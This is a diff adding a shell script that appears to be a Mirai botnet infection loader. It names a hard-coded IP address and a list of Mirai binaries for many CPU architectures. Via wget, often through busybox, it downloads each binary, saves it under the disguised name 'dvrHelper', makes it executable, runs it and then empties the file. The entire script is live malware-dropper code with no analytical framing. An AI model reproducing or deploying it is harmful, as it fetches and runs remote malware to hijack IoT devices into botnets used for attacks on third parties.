@@ -1,0 +1,44 @@
+#!/bin/sh
+
+HTTP_SERVER="51.15.58.189"
+HTTP_PORT=80
+BIN_NAMES="mirai.arm mirai.arm5n mirai.arm7 mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.spc mirai.x86"
+BOT_BIN_NAME="dvrHelper"
+
+for a in $BIN_NAMES
+do
+ if [ -f "/bin/chmod" ]
+ then
+  if [ -f "/bin/busybox" ]
+  then
+   /bin/busybox rm $BOT_BIN_NAME
+   /bin/busybox wget http://$HTTP_SERVER:$HTTP_PORT/bins/$a -O - > $BOT_BIN_NAME
+   /bin/busybox chmod 777 $BOT_BIN_NAME
+   ./$BOT_BIN_NAME
+   >$BOT_BIN_NAME
+  else
+   rm $BOT_BIN_NAME
+   wget http://$HTTP_SERVER:$HTTP_PORT/bins/$a -O - > $BOT_BIN_NAME
+   chmod 777 $BOT_BIN_NAME
+   ./$BOT_BIN_NAME
+   >$BOT_BIN_NAME
+  fi
+ else
+  if [ -f "/bin/busybox" ]
+  then
+   /bin/busybox rm $BOT_BIN_NAME
+   /bin/busybox cp $SHELL $BOT_BIN_NAME
+   >$BOT_BIN_NAME
+   /bin/busybox wget http://$HTTP_SERVER:$HTTP_PORT/bins/$a -O - > $BOT_BIN_NAME
+   ./$BOT_BIN_NAME
+   >$BOT_BIN_NAME
+  else
+   rm $BOT_BIN_NAME
+   cp $SHELL $BOT_BIN_NAME
+   >$BOT_BIN_NAME
+   wget http://$HTTP_SERVER:$HTTP_PORT/bins/$a -O - > $BOT_BIN_NAME
+   ./$BOT_BIN_NAME
+   >$BOT_BIN_NAME
+  fi
+ fi
+done
